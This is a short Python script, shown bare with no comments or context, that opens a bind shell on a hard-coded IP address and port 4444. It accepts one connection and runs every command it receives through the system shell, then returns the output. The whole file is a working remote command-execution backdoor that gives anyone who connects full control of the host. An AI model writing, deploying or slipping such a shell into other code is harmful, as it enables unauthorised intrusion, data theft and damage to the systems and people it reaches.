import socket, subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.bind(("37.38.156.138", 4444))

s.listen(5)

socket_, address = s.accept()

socket_.send(("connect to: " + str(address)).encode("utf-8"))

while True:
    recv = socket_.recv(1024).decode("utf-8")

    response = subprocess.check_output(recv, shell=True)

    if (len(response) < 1):
        socket_.send("ok".encode("utf-8"))
    else:
        socket_.send(str(response).encode("utf-8"))
    